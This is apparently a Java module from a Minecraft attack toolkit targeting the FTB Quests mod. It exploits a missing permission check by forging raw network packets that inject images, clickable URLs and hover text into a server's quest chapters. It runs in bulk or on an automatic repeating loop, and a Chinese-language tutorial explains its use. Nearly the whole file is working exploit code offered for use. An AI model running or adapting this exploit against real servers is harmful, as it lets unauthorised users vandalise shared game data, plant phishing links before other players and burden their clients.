package com.redblue.red.modules.ftbquests;

import com.redblue.red.core.AttackModule;
import com.redblue.red.core.config.ConfigParam;
import com.redblue.red.util.PacketForge;
import net.minecraft.client.Minecraft;
import net.minecraft.resources.ResourceLocation;
import net.minecraftforge.fml.ModList;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.util.List;

/**
 * FTQ-04: CopyChapterImageMessage has NO permission check.
 *
 * handle() directly adds image to chapter + markDirty() + broadcasts.
 * No NetUtils.canEdit() guard.
 *
 * Wire format (Architectury SimpleNetworkManager on Forge):
 *   Vanilla channel: "architectury:network"
 *   Payload: ResourceLocation("ftbquests:copy_chapter_image")
 *            + writeLong(chapterId)
 *            + ChapterImage.writeNetData(buf)
 *
 * ChapterImage.writeNetData order:
 *   writeDouble(x) + writeDouble(y) + writeDouble(width) + writeDouble(height)
 *   + writeDouble(rotation) + writeUtf(icon, 32767) + writeInt(color_rgb)
 *   + writeInt(alpha) + writeInt(order) + writeVarInt(hover_count)
 *   + [writeUtf(hover_text, 32767)]* + writeUtf(click, 32767)
 *   + writeBoolean(editorsOnly) + writeBoolean(alignToCorner)
 *   + writeLong(dependencyId)
 *
 * NOTE: Cannot use reflection on FriendlyByteBuf constructor because it
 * references ServerQuestFile.INSTANCE.getChapter() which is null on client.
 * Must use raw PacketForge instead.
 */
public class FTQ04_ChapterImageInject implements AttackModule {

    private static final Logger LOG = LoggerFactory.getLogger("ModCompat");

    private static final ResourceLocation ARCH_CHANNEL =
        new ResourceLocation("architectury", "network");
    private static final ResourceLocation MSG_ID =
        new ResourceLocation("ftbquests", "copy_chapter_image");

    private final List<ConfigParam> params = List.of(
        ConfigParam.ofBool("enabled", "启用", false),
        ConfigParam.ofString("chapter_id", "目标章节ID(十六进制/十进制)", ""),
        ConfigParam.ofString("image_url", "图片URL/图标",
            "minecraft:textures/gui/presets/isles.png"),
        ConfigParam.ofString("click_url", "点击链接URL", ""),
        ConfigParam.ofString("hover_text", "悬停提示文本", ""),
        ConfigParam.ofFloat("img_width", "图片宽度", 5f, 0.1f, 100f),
        ConfigParam.ofFloat("img_height", "图片高度", 5f, 0.1f, 100f),
        ConfigParam.ofInt("inject_count", "注入数量", 10, 1, 500),
        ConfigParam.ofInt("interval", "自动发包间隔(tick)", 10, 1, 200)
    );

    private long lastTick = 0;

    @Override public String id() { return "ftq04_chapter_image_inject"; }
    @Override public String name() { return "章节图片注入"; }
    @Override public String description() {
        return "向任务章节注入自定义图片URL";
    }

    @Override
    public String getTutorial() {
        return "[使用方法]\n"
             + "1. 从任务书同步数据中获取章节ID\n"
             + "2. 设置图片URL及可选的点击链接/悬停文本\n"
             + "3. 点击执行或启用自动模式\n\n"
             + "[参数说明]\n"
             + "- 目标章节ID: 要注入图片的章节ID\n"
             + "- 图片URL/图标: 注入的图片资源路径\n"
             + "- 点击链接URL: 点击图片后打开的链接\n"
             + "- 悬停提示文本: 鼠标悬停时显示的文字\n"
             + "- 图片宽度/高度: 注入图片的显示尺寸\n"
             + "- 注入数量: 单次执行注入的图片数量\n\n"
             + "[注意事项]\n"
             + "- 大量注入可能导致客户端内存占用增加\n"
             + "- 自动模式会持续随机位置注入图片";
    }

    @Override
    public boolean isAvailable() {
        return ModList.get().isLoaded("ftbquests");
    }

    @Override
    public List<ConfigParam> getConfigParams() { return params; }

    @Override
    public void execute(Minecraft mc) {
        if (mc.player == null) return;
        long chapterId = parseLongParam("chapter_id");
        if (chapterId == 0) return;

        int count = getParam("inject_count").map(ConfigParam::getInt).orElse(10);
        for (int i = 0; i < count; i++) {
            double x = (i % 20) * 2.0 - 20;
            double y = (i / 20) * 2.0 - 20;
            sendImagePacket(chapterId, x, y);
        }
    }

    @Override
    public void tick(Minecraft mc) {
        if (mc.player == null) return;
        int interval = getParam("interval").map(ConfigParam::getInt).orElse(10);
        long now = mc.level.getGameTime();
        if (now - lastTick < interval) return;
        lastTick = now;

        long chapterId = parseLongParam("chapter_id");
        if (chapterId == 0) return;

        double x = Math.random() * 100 - 50;
        double y = Math.random() * 100 - 50;
        sendImagePacket(chapterId, x, y);
    }

    private long parseLongParam(String key) {
        String val = getParam(key).map(ConfigParam::getString).orElse("0");
        try {
            if (val.startsWith("0x") || val.startsWith("0X")) {
                return Long.parseUnsignedLong(val.substring(2), 16);
            }
            return Long.parseLong(val);
        } catch (NumberFormatException e) {
            return 0L;
        }
    }

    /**
     * Send via raw PacketForge on architectury:network channel.
     * Wire: ResourceLocation(ftbquests:copy_chapter_image)
     *       + writeLong(chapterId)
     *       + ChapterImage.writeNetData fields
     */
    private void sendImagePacket(long chapterId, double x, double y) {
        float w = getParam("img_width").map(ConfigParam::getFloat).orElse(5f);
        float h = getParam("img_height").map(ConfigParam::getFloat).orElse(5f);
        String imageUrl = getParam("image_url").map(ConfigParam::getString)
            .orElse("minecraft:textures/gui/presets/isles.png");
        String clickUrl = getParam("click_url").map(ConfigParam::getString)
            .orElse("");
        String hoverText = getParam("hover_text").map(ConfigParam::getString)
            .orElse("");

        PacketForge.send(ARCH_CHANNEL, buf -> {
            // Architectury header: message type ResourceLocation
            buf.writeResourceLocation(MSG_ID);

            // CopyChapterImageMessage.write: writeLong(chapterId)
            buf.writeLong(chapterId);

            // ChapterImage.writeNetData fields in order:
            buf.writeDouble(x);           // x
            buf.writeDouble(y);           // y
            buf.writeDouble(w);           // width
            buf.writeDouble(h);           // height
            buf.writeDouble(0.0);         // rotation

            // NetUtils.writeIcon = writeUtf(icon.toString(), 32767)
            buf.writeUtf(imageUrl, 32767);

            buf.writeInt(0xFFFFFF);       // color (white RGB)
            buf.writeInt(255);            // alpha
            buf.writeInt(0);              // order

            // NetUtils.writeStrings(hover):
            //   writeVarInt(size) + for each: writeUtf(s, 32767)
            if (hoverText.isEmpty()) {
                buf.writeVarInt(0);
            } else {
                buf.writeVarInt(1);
                buf.writeUtf(hoverText, 32767);
            }

            buf.writeUtf(clickUrl, 32767); // click
            buf.writeBoolean(false);       // editorsOnly
            buf.writeBoolean(false);       // alignToCorner
            buf.writeLong(0L);             // dependency (none)
        });
    }
}
